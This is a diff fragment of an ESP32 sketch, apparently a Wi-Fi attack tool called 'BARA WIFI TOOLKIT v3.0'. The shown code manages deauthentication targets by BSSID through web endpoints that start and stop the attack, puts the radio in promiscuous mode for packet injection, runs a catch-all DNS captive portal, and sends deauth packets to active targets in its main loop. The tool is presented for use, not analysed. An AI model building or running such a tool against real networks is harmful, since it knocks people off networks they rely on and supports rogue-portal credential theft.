-        request->send(200, "text/plain", "Target added successfully: " + bssid);
-    });
-    
-    server.on("/startdeauth", HTTP_GET, [](AsyncWebServerRequest *request) {
-        int activeCount = 0;
-        for (int i = 0; i < MAX_DEAUTH_TARGETS; i++) {
-            if (deauthTargets[i].bssid.length() > 0) {
-                deauthTargets[i].active = true;
-                activeCount++;
-            }
-        }
-        
-        if (activeCount == 0) {
-            request->send(400, "text/plain", "No targets configured");
-            return;
-        }
-        
-        deauthGlobalActive = true;
-        addLog("DEAUTH ATTACK STARTED - " + String(activeCount) + " targets");
-        request->send(200, "text/plain", 
-            "Deauth attack started on " + String(activeCount) + " target(s)");
-    });
-    
-    server.on("/stopdeauth", HTTP_GET, [](AsyncWebServerRequest *request) {
-        deauthGlobalActive = false;
-        for (int i = 0; i < MAX_DEAUTH_TARGETS; i++) {
-            deauthTargets[i].active = false;
-        }
-        addLog("All deauth attacks stopped");
-        request->send(200, "text/plain", "All deauth attacks stopped");
-    });
-    
-    server.on("/removetarget", HTTP_GET, [](AsyncWebServerRequest *request) {
-        if (!request->hasParam("bssid")) {
-            request->send(400, "text/plain", "BSSID parameter required");
-            return;
-        }
-        
-        String bssid = request->getParam("bssid")->value();
-        bool found = false;
-        
-        for (int i = 0; i < MAX_DEAUTH_TARGETS; i++) {
-            if (deauthTargets[i].bssid == bssid) {
-                deauthTargets[i].bssid = "";
-                deauthTargets[i].active = false;
-                deauthTargets[i].packetCount = 0;
-                found = true;
-                break;
-            }
-        }
-        
-        if (found) {
-            addLog("Removed target: " + bssid);
-            request->send(200, "text/plain", "Target removed: " + bssid);
-        } else {
-            request->send(404, "text/plain", "Target not found");
-        }
-    });
-    
-    server.on("/metrics", HTTP_GET, [](AsyncWebServerRequest *request) {
-        DynamicJsonDocument doc(2048);
-        doc["uptime"] = millis() / 1000;
-        doc["freeHeap"] = ESP.getFreeHeap();
-        doc["cpuFreq"] = ESP.getCpuFreqMHz();
-        doc["totalScans"] = metrics.totalScans;
-        doc["totalDeauthPackets"] = totalPacketsSent;
-        
-        JsonArray targets = doc.createNestedArray("targets");
-        for (int i = 0; i < MAX_DEAUTH_TARGETS; i++) {
-            if (deauthTargets[i].bssid.length() > 0) {
-                JsonObject target = targets.createNestedObject();
-                target["bssid"] = deauthTargets[i].bssid;
-                target["packets"] = deauthTargets[i].packetCount;
-                target["active"] = deauthTargets[i].active;
-            }
-        }
-        
-        String jsonOutput;
-        serializeJson(doc, jsonOutput);
-        request->send(200, "application/json", jsonOutput);
-    });
-    
-    server.begin();
-}
-
-void addLog(String message) {
-    Serial.println("[BARA] " + message);
-}
-
+// ==================== 🧪 SYSTEM INITIALIZATION ====================
 void setup() {
     Serial.begin(115200);
     delay(1000);
     
-    Serial.println("\n\n========================================");
-    Serial.println("🩸 BARA WIFI TOOLKIT v3.0 FIXED 🩸");
+    Serial.println("\n\n");
+    Serial.println("========================================");
+    Serial.println("🩸 BARA WIFI TOOLKIT v3.0 🩸");
     Serial.println("========================================");
     Serial.println("Developed by: Ahmed Nour Ahmed");
     Serial.println("Location: Qena, Egypt");
     Serial.println("========================================\n");
     
+    // Initialize metrics
     metrics.uptime = 0;
     metrics.totalScans = 0;
     metrics.totalDeauthPackets = 0;
     
+    // Initialize deauth targets
     for (int i = 0; i < MAX_DEAUTH_TARGETS; i++) {
         deauthTargets[i].bssid = "";
         deauthTargets[i].active = false;
         deauthTargets[i].packetCount = 0;
     }
     
+    // Configure WiFi for AP mode with promiscuous capabilities
     WiFi.mode(WIFI_AP);
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
     esp_wifi_init(&cfg);
     esp_wifi_set_mode(WIFI_MODE_AP);
     
+    // Start Access Point
     WiFi.softAP(AP_SSID, AP_PASS);
     WiFi.softAPConfig(
         IPAddress(192, 168, 4, 1),
@@ -1336,18 +1430,25 @@ void setup() {
     );
     
     IPAddress IP = WiFi.softAPIP();
-    Serial.print("🔥 Access Point Started\n   SSID: ");
+    Serial.print("🔥 Access Point Started\n");
+    Serial.print("   SSID: ");
     Serial.println(AP_SSID);
-    Serial.print("   IP: ");
+    Serial.print("   IP Address: ");
+    Serial.println(IP);
+    Serial.print("   URL: http://");
     Serial.println(IP);
     
+    // Enable promiscuous mode for packet injection
     esp_wifi_set_promiscuous(true);
     
+    // Start DNS server for captive portal
     dnsServer.start(53, "*", IP);
     Serial.println("🌐 DNS Server Started (Captive Portal)");
     
+    // Initialize web server
     setupWebInterface();
     Serial.println("🌐 Web Server Started on port 80");
+    
     Serial.println("\n========================================");
     Serial.println("✅ BARA IS ONLINE AND READY");
     Serial.println("========================================\n");
@@ -1355,9 +1456,12 @@ void setup() {
     addLog("System initialized successfully");
 }
 
+// ==================== 🔁 MAIN EXECUTION LOOP ====================
 void loop() {
+    // Process DNS requests for captive portal
     dnsServer.processNextRequest();
     
+    // Execute deauth attacks on active targets
     if (deauthGlobalActive) {
         unsigned long currentTime = millis();
         
@@ -1373,6 +1477,7 @@ void loop() {
         }
     }
     
+    // Update system metrics periodically
     if (millis() - lastStatsUpdate > 30000) {
         metrics.uptime = millis() / 1000;
         metrics.freeHeap = ESP.getFreeHeap();
@@ -1380,6 +1485,7 @@ void loop() {
         lastStatsUpdate = millis();
     }
     
+    // Yield to system tasks
     yield();
     delay(1);
 }
